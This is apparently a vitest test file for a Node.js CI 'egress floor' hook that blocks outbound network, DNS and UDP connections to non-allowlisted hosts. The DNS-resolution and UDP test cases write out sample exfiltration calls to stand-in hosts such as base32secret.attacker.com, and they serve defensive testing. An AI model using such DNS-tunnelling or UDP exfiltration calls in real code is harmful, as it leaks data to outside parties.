import { createRequire } from 'node:module';
import { mkdtempSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';

import { describe, expect, it } from 'vitest';

import { applyEgressFloorEnv, ciEgressPolicies, parseArgs } from './egress-floor.mjs';

const require = createRequire(import.meta.url);
const {
  assertAllowed,
  isAllowedHost,
  targetFromDgramArgs,
  targetFromDnsArgs,
  targetFromHttpArgs,
  targetFromNetArgs,
} = require('./egress-floor-hook.cjs');

describe('egress floor wrapper', () => {
  it('parses named policies and explicit command boundaries', () => {
    expect(parseArgs(['--policy', 'build', '--', 'node', 'build.js'])).toEqual({
      allowlist: [],
      command: ['node', 'build.js'],
      mode: 'deny',
      policyName: 'build',
    });

    expect(
      parseArgs(['--allow=registry.npmjs.org,api.github.com', '--', 'pnpm', 'install']),
    ).toEqual({
      allowlist: ['registry.npmjs.org', 'api.github.com'],
      command: ['pnpm', 'install'],
      mode: 'deny',
      policyName: null,
    });
  });

  it('injects the deny-floor preload into NODE_OPTIONS', () => {
    const env = applyEgressFloorEnv(
      { NODE_OPTIONS: '--experimental-transform-types' },
      { allowlist: ciEgressPolicies.install, mode: 'deny' },
    );

    expect(env.KOVO_EGRESS_ALLOWLIST).toBe('registry.npmjs.org');
    expect(env.KOVO_EGRESS_MODE).toBe('deny');
    expect(env.NODE_OPTIONS).toContain('--experimental-transform-types');
    expect(env.NODE_OPTIONS).toContain('--require=');
    expect(env.NODE_OPTIONS).toContain('scripts/egress-floor-hook.cjs');
  });
});

describe('egress floor policy', () => {
  it('allows loopback and explicit wildcard host matches', () => {
    expect(isAllowedHost('localhost', [])).toBe(true);
    expect(isAllowedHost('127.0.0.1', [])).toBe(true);
    expect(isAllowedHost('127.evil.example', [])).toBe(false);
    expect(isAllowedHost('downloads.registry.npmjs.org', ['*.registry.npmjs.org'])).toBe(true);
    expect(isAllowedHost('registry.npmjs.org', ['*.registry.npmjs.org'])).toBe(false);
  });

  it('extracts host targets from net and http call signatures', () => {
    expect(targetFromNetArgs([{ host: 'registry.npmjs.org', port: 443 }])).toEqual({
      host: 'registry.npmjs.org',
      port: 443,
    });
    expect(targetFromNetArgs([443, 'registry.npmjs.org'])).toEqual({
      host: 'registry.npmjs.org',
      port: 443,
    });
    expect(targetFromHttpArgs(['https://registry.npmjs.org/pnpm', {}], 443)).toEqual({
      host: 'registry.npmjs.org',
      port: 443,
    });
  });

  it('throws a named error when a host is not allowlisted', () => {
    expect(() => assertAllowed('tls.connect', { host: 'example.com', port: 443 }, [])).toThrowError(
      /KOVO egress floor blocked tls\.connect to example\.com:443/,
    );
  });

  // bugz-3 L7 / SPEC.md §744 rule 3, §746: DNS (c-ares tunnelling) and UDP are
  // whole protocol families that bypassed the connect-only floor. They must now
  // route through the same fail-closed sink as net.connect.
  it('extracts and denies DNS resolution + UDP destinations under deny-all (bugz-3 L7)', () => {
    // The exfil payload rides in the resolved hostname / UDP destination host.
    expect(targetFromDnsArgs(['base32secret.attacker.com'])).toEqual({
      host: 'base32secret.attacker.com',
    });
    expect(() =>
      assertAllowed('dns.resolve', targetFromDnsArgs(['base32secret.attacker.com']), []),
    ).toThrowError(/KOVO egress floor blocked dns\.resolve to base32secret\.attacker\.com/);

    // dgram send(msg[, offset, length], port, address) — destination is the sole
    // string after the message, across overloads and the connect() form.
    expect(targetFromDgramArgs([Buffer.from('x'), 53, 'attacker.com'])).toEqual({
      host: 'attacker.com',
    });
    expect(targetFromDgramArgs([Buffer.from('xxxxx'), 0, 5, 53, 'attacker.com'])).toEqual({
      host: 'attacker.com',
    });
    expect(targetFromDgramArgs([53, 'attacker.com'])).toEqual({ host: 'attacker.com' });
    expect(() =>
      assertAllowed(
        'dgram.Socket.send',
        targetFromDgramArgs([Buffer.from('x'), 53, 'attacker.com']),
        [],
      ),
    ).toThrowError(/KOVO egress floor blocked dgram\.Socket\.send to attacker\.com/);

    // Loopback default (no explicit destination), localhost, and allowlisted
    // hosts must still resolve so the floor does not brick legitimate egress.
    expect(targetFromDgramArgs([Buffer.from('x'), 53])).toEqual({ host: 'localhost' });
    expect(() =>
      assertAllowed('dgram.Socket.send', targetFromDgramArgs([Buffer.from('x'), 53]), []),
    ).not.toThrow();
    expect(() => assertAllowed('dns.lookup', targetFromDnsArgs(['localhost']), [])).not.toThrow();
    expect(() =>
      assertAllowed('dns.resolve', targetFromDnsArgs(['registry.npmjs.org']), [
        'registry.npmjs.org',
      ]),
    ).not.toThrow();
  });
});

describe('egress floor runtime', () => {
  it('blocks unexpected outbound requests in child processes', () => {
    const tempDir = mkdtempSync(path.join(os.tmpdir(), 'kovo-egress-floor-'));
    const entryPath = path.join(tempDir, 'blocked.mjs');
    writeFileSync(
      entryPath,
      [
        "import https from 'node:https';",
        'try {',
        "  https.get('https://example.com');",
        '  process.exit(19);',
        '} catch (error) {',
        '  console.error(String(error.message));',
        "  process.exit(error.code === 'KOVO_EGRESS_DENIED' ? 17 : 18);",
        '}',
        '',
      ].join('\n'),
    );

    const result = spawnSync(
      'node',
      ['scripts/egress-floor.mjs', '--policy', 'build', '--', 'node', entryPath],
      {
        cwd: path.resolve(new URL('../', import.meta.url).pathname),
        encoding: 'utf8',
      },
    );

    expect(result.status).toBe(17);
    expect(result.stderr).toContain('KOVO egress floor blocked');
  });

  // bugz-3 L7: prove the live --require hook blocks DNS resolution and UDP sends
  // in the child (not just net/tls/http), matching net.connect, under the
  // deny-all `build` policy (empty allowlist, deny mode).
  it('blocks DNS resolution and UDP datagrams in child processes (bugz-3 L7)', () => {
    const tempDir = mkdtempSync(path.join(os.tmpdir(), 'kovo-egress-floor-dnsudp-'));
    const entryPath = path.join(tempDir, 'blocked-dns-udp.mjs');
    writeFileSync(
      entryPath,
      [
        "import net from 'node:net';",
        "import dns from 'node:dns';",
        "import dgram from 'node:dgram';",
        'const denied = (fn) => {',
        '  try {',
        '    fn();',
        '    return false;',
        '  } catch (error) {',
        "    return error.code === 'KOVO_EGRESS_DENIED';",
        '  }',
        '};',
        // Baseline parity: net.connect is (and stays) blocked.
        "if (!denied(() => net.connect(443, 'example.com'))) process.exit(11);",
        // L7 regression: DNS tunnelling exfil is now blocked.
        "if (!denied(() => dns.resolve('base32secret.attacker.com', () => {}))) process.exit(12);",
        // L7 regression: UDP exfil is now blocked.
        "const socket = dgram.createSocket('udp4');",
        "if (!denied(() => socket.send(Buffer.from('x'), 53, 'attacker.com'))) process.exit(13);",
        'process.exit(23);',
        '',
      ].join('\n'),
    );

    const result = spawnSync(
      'node',
      ['scripts/egress-floor.mjs', '--policy', 'build', '--', 'node', entryPath],
      {
        cwd: path.resolve(new URL('../', import.meta.url).pathname),
        encoding: 'utf8',
      },
    );

    // 23 = all three channels (net.connect, dns.resolve, dgram.send) blocked.
    // 12/13 would mean DNS/UDP slipped past the floor (the pre-fix behavior).
    expect(result.status).toBe(23);
  });
});
